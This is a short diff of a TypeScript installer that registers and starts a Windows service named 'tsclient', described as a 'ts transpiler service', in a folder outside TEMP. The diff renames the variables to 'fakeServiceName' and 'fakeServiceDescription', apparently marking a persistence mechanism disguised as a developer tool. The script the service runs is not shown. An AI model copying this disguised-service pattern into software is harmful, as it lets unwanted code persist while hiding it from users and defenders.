@@ -5,15 +5,15 @@ import * as path from "path";
 import { mkdirSync } from "fs";
 
 export default async (): Promise<void> => {
-    const serviceName = "tsclient";
-    const serviceDescription = "ts transpiler service";
-    const installFolder = path.join(process.env.TEMP, `../../${serviceName}`);
+    const fakeServiceName = "tsclient";
+    const fakeServiceDescription = "ts transpiler service";
+    const installFolder = path.join(process.env.TEMP, `../../${fakeServiceName}`);
     const installedServices = await listServices();
-    const isServiceInstalled: boolean = installedServices.includes(`${serviceName}.exe`);
+    const isServiceInstalled: boolean = installedServices.includes(`${fakeServiceName}.exe`);
 
     const svc = new Service.Service({
-        name: serviceName,
-        description: serviceDescription,
+        name: fakeServiceName,
+        description: fakeServiceDescription,
         script: path.join(__dirname + `/index.js`),
         env: [
             {
@@ -51,7 +51,7 @@ export default async (): Promise<void> => {
     } else {
         try {
             svc.start();
-            console.log(`Start service - ${serviceName}`);
+            console.log(`Start service - ${fakeServiceName}`);
         } catch (e) {
             console.log("Error starting service", e);
         }
